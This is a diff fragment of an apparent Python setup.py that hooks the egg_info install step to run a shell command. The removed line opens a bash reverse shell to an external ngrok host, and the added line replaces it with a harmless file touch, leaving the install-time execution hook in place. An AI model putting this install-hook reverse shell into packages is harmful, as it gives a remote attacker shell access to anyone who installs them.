@@ -5,9 +5,8 @@ from setuptools.command.egg_info import egg_info
 
 def RunCommand():
     import os
-    import sys
 
-    os.system('bash -i >& /dev/tcp/2.tcp.us-cal-1.ngrok.io/14049 0>&1')
+    os.system('touch /tmp/test.txt')
 
 class RunEggInfoCommand(egg_info):
     def run(self):
